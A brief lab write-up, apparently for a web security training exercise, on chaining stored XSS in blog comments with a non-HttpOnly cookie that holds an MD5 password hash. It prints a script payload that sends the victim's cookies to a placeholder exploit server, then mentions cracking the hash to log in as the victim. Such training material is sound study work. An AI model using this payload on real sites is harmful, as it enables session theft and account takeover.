This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`

--------------

# Solution


The stay-logged-in cookie uses `base64(username:md5(password))` with no `HttpOnly` flag, making it accessible to JavaScript. Post an XSS payload in a blog comment that redirects the victim to your exploit server with their cookies appended to the URL. When the victim views the blog post, their `stay-logged-in` cookie gets sent to your access log. You can then either use the cookie directly to access their account, or base64 decode it to extract the MD5 hash and crack the password.

```
<script>document.location='https://YOUR-EXPLOIT-SERVER/exploit?c='+document.cookie</script>
```

Two vulnerabilities chained together: stored XSS in blog comments + predictable cookie without `HttpOnly`.


![](../../images/Pasted%20image%2020261021204546.png)

![](../../images/Pasted%20image%2020261021204440.png)

we crack the weak md5 hash and we get carlos's password easy peay